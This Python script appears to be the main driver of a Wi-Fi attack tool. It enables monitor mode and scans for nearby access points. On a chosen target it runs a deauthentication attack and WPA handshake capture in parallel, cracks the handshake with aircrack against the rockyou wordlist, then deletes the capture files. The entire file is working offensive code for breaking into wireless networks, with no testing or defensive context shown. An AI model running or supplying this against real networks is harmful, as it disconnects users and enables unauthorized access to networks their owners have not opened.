from monitor import MonitorMode
from interface import Interface
from dump import Dump
import threading
from openpyxl import load_workbook
from replay import capture_handshake, deauth_attack
from crack import AircrackWrapper
import os
import subprocess
import shutil

ifs = Interface()
#select interfaces
ifaces = ifs.getInterfaces()
if len(ifaces) == 0:
    exit(0)

while True:    
    for i in range (len(ifaces)):
        print(i+1, ". ", ifaces[i])
    active_iface_no = int(input("[?]Interface no. : "))
    if active_iface_no <= len(ifaces) and active_iface_no >= 1:
        break
    else:
        active_iface_no = None
        
active_interface = ifs.selectInterface(active_iface_no - 1)

#start monitor mode
mon = MonitorMode(active_interface)
mon.startMonitorMode()
active_interface = ifs.selectInterface()
print(ifs.getInterfaces())

#Get APs and Clients
d = Dump()
d.enumAPs(interface = active_interface)

# Load APs from the Excel file generated by Dump
wb = load_workbook("wifi_scan.xlsx")
ws = wb["Access_Points"]

# Parse all APs and store them in a list
aps = []
for row in ws.iter_rows(min_row=2, values_only=True):
    if not row or not row[0] or "BSSID" in str(row[0]):
        continue
    bssid = str(row[0]).strip()
    channel = str(row[3]).strip()
    ssid = str(row[13]).strip() if len(row) > 13 else "Unknown"
    aps.append({
        "bssid": bssid,
        "channel": channel,
        "ssid": ssid
    })

# Display APs to user
if len(aps) == 0:
    print("[!] No access points found in scan.")
    mon.stopMonitorMode()
    exit(0)

print("\n[*] Available Access Points:")
for i, ap in enumerate(aps):
    print(f"{i+1}. {ap['ssid']} ({ap['bssid']}) - Channel {ap['channel']}")

# Ask user to select an AP
while True:
    print("\n[?] Select an AP to target (enter number) or 0 to exit:")
    try:
        selection = int(input("[?] Selection: "))
        if selection == 0:
            print("[*] Exiting without attacking any AP.")
            mon.stopMonitorMode()
            active_interface = ifs.selectInterface()
            print(ifs.getInterfaces())
            exit(0)
        if 1 <= selection <= len(aps):
            break
        else:
            print(f"[!] Invalid selection. Please enter a number between 1 and {len(aps)}, or 0 to exit.")
    except ValueError:
        print("[!] Invalid input. Please enter a number.")

# Get selected AP
selected_ap = aps[selection - 1]
bssid = selected_ap["bssid"]
channel = selected_ap["channel"]
ssid = selected_ap["ssid"]

ROCKYOU = "/usr/share/wordlists/rockyou.txt"

print(f"\n[*] Targeting AP: {ssid} ({bssid}) on channel {channel}")

stop_event = threading.Event()
duration = 120  # 2 minutes
cap_file_holder = [None]  # Use list to store result from thread

def capture_wrapper():
    cap_file_holder[0] = capture_handshake(
        write_prefix=f"handshake_{ssid}",
        channel=channel,
        bssid=bssid,
        interface=active_interface,
        stop_event=stop_event,
        timeout=duration
    )

# Start both deauth and handshake capture in parallel
deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event, duration))
capture_thread = threading.Thread(target=capture_wrapper)

deauth_thread.start()
capture_thread.start()

# Wait for both to complete (with timeout safety)
deauth_thread.join(timeout=duration + 5)
capture_thread.join(timeout=duration + 5)

cap_file = cap_file_holder[0]

# If a handshake was captured, start cracking immediately
if cap_file:
    # ensure rockyou exists
    if os.path.exists(ROCKYOU):
        aw = AircrackWrapper(cap_file, bssid, [ROCKYOU])
        # pass duration as timeout so cracking will stop after same 2 minutes
        cracker_thread = threading.Thread(target=aw.run_and_save, args=(ROCKYOU, duration))
        cracker_thread.daemon = True
        cracker_thread.start()
        print("[*] Cracking started with rockyou.txt (timeout: {}s)".format(duration))
    else:
        print(f"[!] Wordlist not found: {ROCKYOU}. Skipping cracking.")

print(f"[*] Finished with {ssid} ({bssid})")

#stop monitor mode
mon.stopMonitorMode()
active_interface = ifs.selectInterface()
print(ifs.getInterfaces())

# Cleanup leftover handshake-* files
_rm_cmd = "rm -v handshake*"
if shutil.which("rm"):
    try:
        subprocess.run(_rm_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] rm command failed: {e}")
else:
    for _fname in os.listdir("."):
        if _fname.startswith("handshake") and os.path.isfile(_fname):
            try:
                os.remove(_fname)
                print(f"Removed {_fname}")
            except Exception as e:
                print(f"Failed to remove {_fname}: {e}")